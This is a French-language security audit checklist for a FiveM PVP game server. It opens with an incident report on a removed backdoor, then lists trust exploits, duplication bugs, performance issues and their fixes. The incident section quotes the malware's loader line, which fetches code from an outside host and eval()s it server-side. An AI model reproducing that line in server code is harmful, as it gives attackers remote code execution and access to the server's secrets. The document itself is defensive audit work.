# TODO — Audit serveur PVP (généré 2026-06-03)

---

## 🚨 INCIDENT SÉCURITÉ — BACKDOOR RCE (2026-06-03)

- [x] **thug-killfeeds/html/server.js** — backdoor RCE actif : `require('http').get('http://uabjuza.lt:3000/api/connector/execute/js/SC_...')` → `eval()` de code distant arbitraire, chargé **côté serveur** via `fxmanifest.lua` (`server_scripts{ 'html/*.js' }`). Pas dans `escrow_ignore` = injecté furtivement. Famille de malware loader FiveM connue.
  → ✅ Fichier supprimé (`git rm`) + `'html/*.js'` retiré des server_scripts. **Branche `fix/critical-security`.**

### ⚠️ ACTIONS IR À FAIRE (décisions utilisateur)
- [ ] **Considérer le serveur comme compromis** depuis l'installation de thug-killfeeds. Le backdoor a pu exécuter n'importe quel code (vol DB, comptes admin, persistance).
- [ ] **Roter tous les secrets** : tokens Discord/webhooks, clés API, mots de passe DB (`server.cfg`), licence serveur, identifiants steam/admin.
- [ ] **Auditer les autres ressources non-officielles** d'origine douteuse (même source que thug-killfeeds ?).
- [ ] **Vérifier la persistance** : tâches cron/services inattendus, fichiers modifiés récemment, comptes admin DB ajoutés, ressources auto-ajoutées à `server.cfg`.
- [ ] **Décider du sort de thug-killfeeds** : remplacer par une source propre/officielle plutôt que garder un resource trojané (même nettoyé). Webhook hijack `initUrl`/`triggerNotify` toujours présent (voir HIGH).

---
# Reste de l'audit

Audit de ~28k lignes de code custom via 4 agents parallèles. Trié par priorité.
Cocher `[x]` quand fait. Format : `resource/fichier:ligne`.

---

## 🔴 CRITIQUE — exploits client-trusted (PVP-breaking, fixer en premier)

> ✅ Lot corrigé sur branche `fix/critical-security` (2026-06-03). Vérifié par revue manuelle — **test runtime serveur FiveM encore à faire**.

- [x] **viperpvp_redzone/server/main.lua:725** — `death:register(killerId,zoneId)` fired par le **victim**, serveur fait confiance aux deux → farm illimité money/kills via alt.
  → ✅ Guard anti double-crédit (`if DeadPlayers[victimId] then return`), killer mort ne peut pas créditer, victime ET killer doivent être en zone. ⚠️ Validation full damage-tracking (killer a réellement tiré sur victime) = rework plus lourd, **non fait** → reste partiellement client-trusted en collusion proche.
- [x] **viper-weapon-patches/server/weapons.lua:31** — `headshotConfirmed(victimSrc)` → client modifié **instakill n'importe qui, partout**, toutes les 300ms.
  → ✅ Gate distance serveur-side : attaquant doit être à portée d'arme max (`headshotMaxDist`) de la victime. Défait l'instakill à distance arbitraire. ⚠️ Pas de raycast/ligne de vue serveur (impossible simplement) → spoofable au contact comme un tir légitime.
- [x] **vipertpramp/server/main.lua:187** — `selfRevive` net event, **aucune auth, aucun check mort** → self-revive instantané.
  → ✅ Exige mort validée serveur-side via nouvel export redzone `IsPlayerDead(src)` ; efface l'état via `ClearPlayerDeath(src)` après revive.
- [x] **vipercar/server/main.lua:151** — `SpawnVehicle` relaie `model`+coords client sans check → spawn n'importe quel véhicule n'importe où.
  → ✅ Whitelist `AllowedModels` construite depuis `Config.Vehicles`. ⚠️ `spawnData` (coords) reste client-fourni — risque moindre (son propre véhicule).
- [x] **viper-boutique/server/main.lua:565** — `saveVehicleMods` aucun check de propriété.
  → ✅ Guard ownership `SELECT COUNT(*) FROM boutique_vehicles WHERE citizenid=? AND vehicle_model=?` avant write.
- [x] **viperjail/server/main.lua:272** — `unjailOffline` args du log **décalés** → lignes corrompues, action défaut 'JAIL'.
  → ✅ `LogJailAction(src, pName, '', cid, 'UNJAIL', nil, nil, nil)`.

---

## 🟠 HIGH — exploits + dupe / intégrité

- [ ] **viperpvp_redzone/server/main.lua:948** — `loot:request` gardé seulement sur mort déclarée client → looter n'importe qui.
- [ ] **viper-blanchiment/server/main.lua:157** — retour `RemoveItem` **ignoré** puis `AddMoney` → dupe black_money. Wrap `if RemoveItem() then`.
- [ ] **viper_kit/server/main.lua:187** — `claim` TOCTOU → spam = double-claim kits one-time. Insert atomique + check affected rows.
- [ ] **viper_ranked/server/shop.lua:79** — `buyItem` check-then-act → overspend cross-items. `UPDATE ... WHERE coins>=?` atomique.
- [ ] **viper_ranked/server/queue.lua:24** — `CheckWeaponLoadout` **fail-open** sur erreur API → restriction off en silence. Fail-closed.
- [ ] **thug-killfeeds/server/main.lua:23** — `initUrl` net event → n'importe quel client hijack le webhook Discord. Hardcode serveur-side, supprimer l'event.
- [ ] **vipersquad/server/server.lua:472** — `updateSquadSettings` n'importe quel membre set name/image/memberLimit, pas de check owner + pas de clamp.
- [ ] **vipersquad/server/server.lua:110** — `getMemberCoords` renvoie coords de **n'importe quel** player id → wallhack/radar. Vérifier même squad.
- [ ] **viper-emote/Client/Emote.lua:318** — `if ChosenDict == "MaleScenario" or "Scenario"` toujours-vrai (literal truthy). → `or ChosenDict == "Scenario"`.

---

## 🟡 MED — bugs

- [ ] **viperpvp_redzone/server/main.lua:802** — `Carriers` utilisé avant son `local` → résout en global → cleanup carry du revive = no-op silencieux. **CLAUDE.md le marque "résolu" — régressé.** Déplacer la decl avant le handler.
- [ ] **viper-dv/server/main.lua:9** — `GetPlayerIdentifierByType(src,...)` attend un string → `tostring(src)`, sinon check admin license échoue en silence.
- [ ] **viper-hud/client/main.lua:278** — callback NUI `safeDone` ré-enregistré dans le handler à chaque `/safe` → closure coords périmée. Enregistrer une fois au scope fichier.
- [ ] **viper_ranked/match.lua** — `StartRound` planifié check `Matches[id]` mais pas `state` → peut fire sur match terminé. Ajouter guard `state ~= 'ended'`.
- [ ] **viper-coca/server/main.lua:109,127** — distance ne check pas `Zone.z` → harvest/sell possible à un autre étage (2D radius seul).
- [ ] **viperlogs/server/main.lua:180,199** — `days` concaténé dans le SQL (`tonumber` actuel le protège mais pattern fragile). Préférer entier paramétré/clampé.

---

## ⚡ PERF — gaspillage per-frame

- [ ] **vipersquad** — threads chevauchants (50ms/200ms/5s) **re-spawnés** à chaque changement membre/settings, pas de dedup → fuite de threads. Guard running-flag.
- [ ] **vipersquad/client/nametags.lua:81** — distance = ped vs **lui-même** = toujours 0 → gate distance inutile. Comparer au ped local.
- [ ] **viper-emote** — 3 threads tight permanents (`Wait(1)`×2 + `Wait(0)`) ; idle à 150-250ms quand pas d'anim/menu.
- [ ] **viper-hud/client/blips.lua:28** — scan sprites 2..826 toutes les 15s en permanence. Utiliser le blip pool.
- [ ] **viper_kit/server/main.lua:168** — N+1 queries cooldown dans la boucle `getMyKits`. Batch en une query.
- [ ] **viperjail/client/main.lua:71** — `closeInventory` pcall chaque frame quand jailed. Throttle ~250ms ou seulement si inventaire ouvert.

---

## 🧹 SIMPLICITÉ — duplication / dead code

- [ ] **NPC ground-snap spawn dupliqué 4×** (vipercar, vipergun, viper-boutique, viperpvp_redzone) — ~60 lignes chacun. Extraire un export partagé.
- [ ] **4 `IsAdmin` différents** (license vs ACE vs group), incohérents → admin dans une resource ≠ admin dans une autre. Export partagé unique.
- [ ] **viper-boutique/server/main.lua:458,525** — `BroadcastGarageNpcs`/`BroadcastCustomNpcs` définis, jamais appelés. Dead code.
- [ ] **viper-emote/Client/EmoteMenu.lua:68** — `table.insert` danceemotes dupliqué ; `/e` suggestion enregistrée 2×. Supprimer doublons.
- [ ] **xeroshieldv3** — 3rd-party obfusqué, ouvre un listener websocket ; non auditable. Vérifier que le port `5104` n'est pas exposé externe ; confiance = vendor uniquement.

---

## Notes économie (design, pas bug code)

- [ ] **viper-shop buy/sell + viper-blanchiment** — boucle fermée : buy money → sell 45% black_money → launder back to cash. Auditer `Config.LaundryRate` × 0.45 ; bloquer resale d'items juste achetés ou baisser le taux.
